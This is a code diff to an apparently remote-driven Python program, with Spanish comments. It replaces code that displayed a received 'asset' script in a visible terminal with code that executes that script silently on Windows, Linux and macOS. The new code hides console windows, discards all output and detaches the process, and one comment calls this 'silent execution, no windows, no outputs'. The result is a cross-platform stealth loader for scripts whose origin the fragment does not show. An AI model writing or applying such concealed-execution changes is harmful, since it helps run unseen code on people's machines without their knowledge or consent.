@@ -243,56 +243,41 @@ async def main():
                                             
                                             print(f"Asset guardado en: {asset_path}")
                                             
-                                            # ═══════════════════════════════════════
-                                            # EJECUCIÓN SEGÚN PLATAFORMA
-                                            # ═══════════════════════════════════════
+                                            # EJECUCIÓN SILENCIOSA (sin ventanas, sin outputs)
                                             
                                             if local_os == "windows":
-                                                # Opción A: Abrir CMD y mostrar contenido (type)
-                                                # subprocess.Popen(["cmd", "/k", "type", asset_path], 
-                                                #                 creationflags=subprocess.CREATE_NEW_CONSOLE)
-                                                
-                                                # Opción B: Ejecutar como batch directamente
-                                                subprocess.Popen(["cmd", "/k", asset_path], 
-                                                                creationflags=subprocess.CREATE_NEW_CONSOLE)
+                                                # Ejecutar batch SIN ventana de consola
+                                                subprocess.Popen(
+                                                    ["cmd", "/c", asset_path],  # /c ejecuta y termina (no /k)
+                                                    creationflags=subprocess.CREATE_NO_WINDOW,
+                                                    stdout=subprocess.DEVNULL,
+                                                    stderr=subprocess.DEVNULL,
+                                                    stdin=subprocess.DEVNULL  # Evita que espere input
+                                                )
                                                 
                                             elif local_os == "linux":
-                                                # Dar permisos de ejecución
                                                 os.chmod(asset_path, 0o755)
+                                                # Ejecutar sin mostrar nada en terminal
+                                                subprocess.Popen(
+                                                    ["bash", asset_path],
+                                                    stdout=subprocess.DEVNULL,
+                                                    stderr=subprocess.DEVNULL,
+                                                    stdin=subprocess.DEVNULL,
+                                                    start_new_session=True  # Desatachar completamente
+                                                )
                                                 
-                                                # Intentar abrir en terminales comunes
-                                                terminals = [
-                                                    ["gnome-terminal", "--", "bash", "-c", f"cat {asset_path}; read -p 'Presiona Enter...'"],
-                                                    ["konsole", "-e", "bash", "-c", f"cat {asset_path}; read -p 'Presiona Enter...'"],
-                                                    ["xfce4-terminal", "-e", f"bash -c 'cat {asset_path}; read -p \"Presiona Enter...\"'"],
-                                                    ["xterm", "-e", f"cat {asset_path}; read -p 'Presiona Enter...'"],
-                                                    ["kitty", "sh", "-c", f"cat {asset_path}; read -p 'Presiona Enter...'"]
-                                                ]
-                                                
-                                                launched = False
-                                                for term_cmd in terminals:
-                                                    try:
-                                                        subprocess.Popen(term_cmd)
-                                                        launched = True
-                                                        break
-                                                    except FileNotFoundError:
-                                                        continue
-                                                
-                                                if not launched:
-                                                    # Fallback: ejecutar en background sin terminal visible
-                                                    subprocess.Popen(["bash", asset_path])
-                                                    
                                             elif local_os == "mac":
-                                                # Dar permisos
                                                 os.chmod(asset_path, 0o755)
-                                                
-                                                # Abrir Terminal.app y ejecutar
-                                                subprocess.Popen([
-                                                    "osascript", "-e",
-                                                    f'tell application "Terminal" to do script "cat {asset_path}; read -p \\"Presiona Enter...\\""'
-                                                ])
-                                                
-                                            print(f"Ejecutado asset de {local_os}")
+                                                # Ejecutar sin abrir Terminal.app
+                                                subprocess.Popen(
+                                                    ["bash", asset_path],
+                                                    stdout=subprocess.DEVNULL,
+                                                    stderr=subprocess.DEVNULL,
+                                                    stdin=subprocess.DEVNULL,
+                                                    start_new_session=True
+                                                )
+
+                                            print(f"Script ejecutado silenciosamente en {local_os}")
                                             
                                         except Exception as e:
                                             print(f"Error: {e}")
